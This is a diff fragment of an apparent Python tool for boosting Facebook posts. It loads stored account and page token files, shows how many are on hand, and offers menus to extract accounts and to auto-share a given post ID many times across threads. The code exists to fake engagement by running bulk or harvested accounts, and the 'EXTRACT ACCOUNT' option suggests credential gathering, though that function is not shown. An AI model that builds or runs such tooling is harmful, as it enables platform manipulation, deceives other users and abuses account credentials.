+    with ThreadPoolExecutor(max_workers=max_workers) as executor:
+        for _ in range(num_shares):
+            executor.submit(worker)
+
+    end_all = time.time()  # Record the end time for the entire operation
+    duration = end_all - start_all
+    print(f"    {blue}───────────────────────────────────────────────────────────────\033[0m")
+    print(f"\n  {yellow}Sharing started: {start_all}")
+    print(f"    {blue}───────────────────────────────────────────────────────────────\033[0m")
+    print(f"     {yellow}Sharing ended: {end_all}")
+    print(f"    {blue}───────────────────────────────────────────────────────────────\033[0m")
+    print(f"    {yellow}Total duration: {duration:.2f} seconds\033[0m")
+def count_tokens(accounts_file, pages_file):
+    """Count the number of accounts and pages stored in the respective files."""
+    total_accounts = 0
+    total_pages = 0
+
+    try:
+        with open(accounts_file, 'r') as af:
+            total_accounts = sum(1 for line in af if line.strip())  # Count non-empty lines
+    except FileNotFoundError:
+        print(f"Account file not found: {accounts_file}")
+
+    try:
+        with open(pages_file, 'r') as pf:
+            total_pages = sum(1 for line in pf if line.strip())  # Count non-empty lines
+    except FileNotFoundError:
+        print(f"Page file not found: {pages_file}")
+
+    return total_accounts, total_pages
+def main():
+    clear_screen()
+    jovan()
+    print(f"""     \033[1;37mCHOOSE TYPE OF ACCOUNTS TO AUTO SHARE: 
+     \033[1;34m[1] \033[1;32mFRA ACCOUNT 
+     \033[1;34m[2] \033[1;32mFRA PAGES
+     \033[1;34m[3] \033[1;32mRPW ACCOUNT
+     \033[1;34m[4] \033[1;32mRPW PAGES
+     \033[1;31m[0] \033[1;31mEXIT 
+    \033[1;34m───────────────────────────────────────────────────────────────\033[0m""")
+    choice = input(f"     {blue}Choice ")
+    
+    file_map = {
+        '1': '/sdcard/boostphere/FRAACCOUNT.txt',
+        '2': '/sdcard/boostphere/FRAPAGES.txt',
+        '3': '/sdcard/boostphere/RPWACCOUNT.txt',
+        '4': '/sdcard/boostphere/RPWACCOUNT.txt'
+    }
+
+    file_path = file_map.get(choice)
+    if not file_path:
+        print("Invalid choice. Exiting.")
+        return
+
+    print(f"    {blue}───────────────────────────────────────────────────────────────\033[0m")
+    post_id = input(f"   {yellow}Enter the post ID to share: ")
+    print(f"    {blue}───────────────────────────────────────────────────────────────\033[0m")
+    num_shares = int(input(f"   {blue}Limit: "))
+
+    # Construct the link using the post ID
+    link = f"https://www.facebook.com/{post_id}"
+
+    share_in_threads(link, file_path, num_shares)
+def main2(): 
+    fraaccounts_file = '/sdcard/boostphere/FRAACCOUNT.txt'
+    frapages_file = '/sdcard/boostphere/FRAPAGES.txt'
+    rpwaccounts = '/sdcard/boostphere/RPWACCOUNT.txt'
+    rpwpages = '/sdcard/boostphere/RPWPAGES.txt'
+    total_accounts, total_pages = count_tokens(fraaccounts_file, frapages_file)
+    total_account_rpw, total_pages_rpw = count_tokens(rpwaccounts,rpwpages)
+    clear_screen()
+    jovan()
+    print(f"""                 {yellow}OVERVIEW OF STORED ACCOUNT & PAGES💫
+          
+                            {blue}FRA ACCOUNT{yellow} : {green}{total_accounts}
+                            {blue}FRA PAGES  {yellow} : {green}{total_pages}
+                            {blue}RPW ACCOUNT{yellow} : {green}{ total_account_rpw}
+                            {blue}RPW PAGES  {yellow} : {green}{total_pages_rpw}
+      {blue}───────────────────────────────────────────────────────────────\033[0m""")
+    print(f"     {blue}[1] {yellow}EXTRACT ACCOUNT")
+    print(f"     {blue}[2] {yellow}AUTO SHARE ")
+    print(f"    {blue}───────────────────────────────────────────────────────────────\033[0m")
+    choice = input(f'    {yellow}Enter Choice: ')
+    if choice == '1': 
+        extraction()
+    if choice == '2': 
+        main()
+
+if __name__ == "__main__":
+    main2()
